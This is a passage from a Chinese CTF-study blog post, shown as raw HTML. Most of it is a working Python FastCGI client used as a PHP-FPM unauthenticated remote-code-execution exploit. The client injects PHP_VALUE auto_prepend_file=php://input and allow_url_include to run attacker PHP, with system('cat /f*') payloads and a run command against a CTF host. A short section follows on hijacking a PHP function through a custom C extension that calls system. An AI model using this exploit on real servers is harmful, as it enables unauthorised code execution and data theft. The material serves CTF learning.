&amp; <span class="number">0xFF</span>) \</span><br><span class="line">              + bchr(<span class="number">0</span>) \</span><br><span class="line">              + bchr(<span class="number">0</span>) \</span><br><span class="line">              + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(<span class="variable language_">self</span>.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = <span class="variable language_">self</span>.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.__connect():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(<span class="variable language_">self</span>.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += <span class="variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += <span class="variable language_">self</span>.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += <span class="variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += <span class="variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += <span class="variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += <span class="variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.sock.send(request)</span><br><span class="line">        <span class="variable language_">self</span>.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        <span class="variable language_">self</span>.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__waitForResponse</span>(<span class="params">self, requestId</span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = <span class="variable language_">self</span>.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = <span class="variable language_">self</span>.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    <span class="variable language_">self</span>.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    <span class="variable language_">self</span>.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                <span class="variable language_">self</span>.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.host, <span class="variable language_">self</span>.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>,</span><br><span class="line">                        default=<span class="string">&#x27;&lt;?php system(&quot;cat /flagfile&quot;); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">28074</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>   : <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>  : documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>      : uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>     : <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>      : uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>    : documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>  : <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>      : <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>      : <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>      : <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>      : <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>      : <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>  : <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>     : <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>   : <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>        : <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>  : <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    <span class="built_in">print</span>(force_text(response))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python exp.py -c ‘&lt;?php system(<span class="string">&quot;cat /f*&quot;</span>);?&gt;’ -p <span class="number">28074</span> pwn.challenge.ctf.show /usr/local/lib/php/System.php  这个位置要把/usr/local/lib/php/System.php改为默认的php地址</span><br></pre></td></tr></table></figure><h1 id="劫持mysqli"><a class="markdownIt-Anchor" href="#劫持mysqli"></a> 劫持mysqli</h1><p>​ shell_exec(“php -r ‘ctfshow();’”); 这个命令是去执行php中的ctfshow()函数,我们可以通过挟持php内置函数或者扩展函数来得到</p><table><thead><tr><th>优先级</th><th>来源</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>当前脚本中定义</td><td><code>function ctfshow() &#123;&#125;</code></td></tr><tr><td>2</td><td>PHP 内置函数或扩展函数</td><td>来自加载的扩展</td></tr><tr><td>3</td><td>动态注册的函数</td><td>如 eval、runkit、FFI</td></tr><tr><td>4</td><td>手动包含的外部文件</td><td><code>include/require</code> 的函数</td></tr><tr><td>❌</td><td>自动加载</td><td>函数级别不适用（类可 autoload）</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">所以我们现在需要去生成php的扩展,使用ext_skel.php 是 PHP 源代码中用于 生成 PHP 扩展（C 扩展）模板代码 的脚本。</span><br><span class="line">    php ext_skel.php --ext ctfshow --vendor ctfshow --std</span><br><span class="line">             --使用这个去生成，然后更改.c文件就行了</span><br><span class="line">    文件头包含stdlib.h 才能用system命令</span><br><span class="line">    修改ZEND_MODULE_APT_NO 为环境版本</span><br><span class="line">    </span><br><span class="line">    phpize</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://blog.wanyanai.top">wan yan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://blog.wanyanai.top/2025/10/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/">https://blog.wanyanai.top/2025/10/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/wanyan.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/25/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%90%84%E7%A7%8D%E5%8C%85/" title="各种包"><div class="cover" style="background:var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">各种包</div></div><div class="info-2"><div class="info-item-1">1.os包: 1 功能 描述 os.Create(name string) 创建一个新文件，如果文件已存在则覆盖。 os.Open(name string) 打开指定的文件。 os.Remove(name string) 删除指定文件。 os.Rename(oldpath, newpath string) 重命名文件或目录。 os.Mkdir(name string, perm os.FileMode) 创建一个目录。 os.MkdirAll(path string, perm os.FileMode) 递归创建目录。 os.Getenv(key string) 获取环境变量的值。 os.Setenv(key, value string) 设置环境变量的值。 os.Unsetenv(key string) 删除环境变量。 os.Exit(code...</div></div></div></a><a class="pagination-related" href="/2025/10/25/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="基础语法"><div class="cover" style="background:var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">基础语法</div></div><div class="info-2"><div class="info-item-1">1.verb（格式化动词） 1在 fmt.Printf()、fmt.Sprintf() 等函数中，verb 是以 % 开头的标识符，用于告诉程序以何种格式显示变量。 1.常用 verb 格式化动词表 动词 含义 示例输出（假设变量值为 x = 42） %v 默认格式输出 42 %+v 输出结构体时，包含字段名 &#123;Name:Tom Age:18&#125; %#v 输出 Go 语法表示的值 main.User&#123;Name:&quot;Tom&quot;, Age:18&#125; %T 显示变量类型 int %% 输出 % 本身 % 2.数值类型格式化 verb 动词 说明 示例 (x = 42) %d 十进制整数 42 %b 二进制整数 101010 %o 八进制 52 %x 十六进制（小写） 2a %X 十六进制（大写） 2A %c Unicode 字符 *（如果 42） 3.字符串和布尔类型 动词 说明 示例 (s =...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/wanyan.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info-name">wan yan</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/wan1yan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/wan1yan" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Patience is key in life</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php"><span class="toc-number">1.</span> <span class="toc-text">php</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1sprintf%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.sprintf函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2mb_strpos%E5%92%8Cmb_substr%E5%87%BD%E6%95%B0php739"><span class="toc-number">1.2.</span> <span class="toc-text">2.mb_strpos和mb_substr函数(php7.3.9):</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21mb_strpos%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1mb_strpos函数:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22mb_substr%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2mb_substr函数:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">1.2.3.</span> <span class="toc-text">结论:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3filter_validate_ip%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">3.FILTER_VALIDATE_IP函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4filter_validate_email%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.</span> <span class="toc-text">4.FILTER_VALIDATE_EMAIL函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">5.命令注入长度限制绕过:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#115%E4%BD%8D%E5%8F%AF%E6%8E%A7%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.15位可控字符下的任意命令执行:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-5%E4%BD%8D%E5%8F%AF%E6%8E%A7%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.7-5位可控字符下的任意命令执行:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34%E4%BD%8D%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.3.</span> <span class="toc-text">3.4位命令执行:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python"><span class="toc-number">2.</span> <span class="toc-text">python:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">1.执行函数 :</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask%E7%AE%97pin"><span class="toc-number">3.</span> <span class="toc-text">flask算pin:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1pin%E7%A0%81%E7%9A%84%E7%94%9F%E6%88%90"><span class="toc-number">3.1.</span> <span class="toc-text">1.pin码的生成:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2python36md5"><span class="toc-number">3.2.</span> <span class="toc-text">2.python3.6(md5):</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3python38sha1"><span class="toc-number">3.3.</span> <span class="toc-text">3.python3.8(sha1):</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%A0%E6%95%B0%E5%AD%97rcelinxu"><span class="toc-number">4.</span> <span class="toc-text">无字母无数字rce(linxu):</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">前置知识:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%B6"><span class="toc-number">4.2.</span> <span class="toc-text">1.无字母时:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E4%BD%BF%E7%94%A80-1"><span class="toc-number">4.3.</span> <span class="toc-text">2.使用0-1:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D"><span class="toc-number">4.4.</span> <span class="toc-text">3.无数字字母:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%A0%E6%95%B0%E5%AD%97rcephp"><span class="toc-number">5.</span> <span class="toc-text">无字母无数字rce(php):</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%BC%82%E6%88%96"><span class="toc-number">5.1.</span> <span class="toc-text">1.异或:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-number">5.2.</span> <span class="toc-text">2.或运算:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%8F%96%E5%8F%8D"><span class="toc-number">5.3.</span> <span class="toc-text">3.取反:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#open_basedir%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">open_basedir绕过:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">6.1.</span> <span class="toc-text">1.使用命令执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E4%BD%BF%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%BE%97%E4%B8%8D%E5%88%B0%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">6.2.</span> <span class="toc-text">2.使用伪协议(得不到文件内容)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E5%88%A9%E7%94%A8ini_set%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">6.3.</span> <span class="toc-text">3.利用ini_set读取文件内容:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="toc-number">6.4.</span> <span class="toc-text">4.软连接:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%97%A0%E5%8F%82rce"><span class="toc-number">7.</span> <span class="toc-text">php无参RCE:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1getallheaders"><span class="toc-number">7.1.</span> <span class="toc-text">1.getallheaders():</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2get_defined_vars"><span class="toc-number">7.2.</span> <span class="toc-text">2.get_defined_vars():</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3session_start"><span class="toc-number">7.3.</span> <span class="toc-text">3.session_start():</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4scandir"><span class="toc-number">7.4.</span> <span class="toc-text">4.scandir():</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">8.</span> <span class="toc-text">反弹shell:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">8.1.</span> <span class="toc-text">1.bash反弹shell:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2netcat%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9"><span class="toc-number">8.2.</span> <span class="toc-text">2.netcat一句话反弹:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3curl%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">8.3.</span> <span class="toc-text">3.curl反弹shell:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ftp%E5%8D%8F%E8%AE%AE%E6%89%93php-fpm"><span class="toc-number">9.</span> <span class="toc-text">FTP协议打PHP-FPM:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-fpm%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text">PHP-FPM未授权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81mysqli"><span class="toc-number">11.</span> <span class="toc-text">劫持mysqli</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/25/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C/" title="网络">网络</a><time datetime="2025-10-25T13:40:14.000Z" title="Created 2025-10-25 21:40:14">2025-10-25</time></div></div><div class="aside-list-item 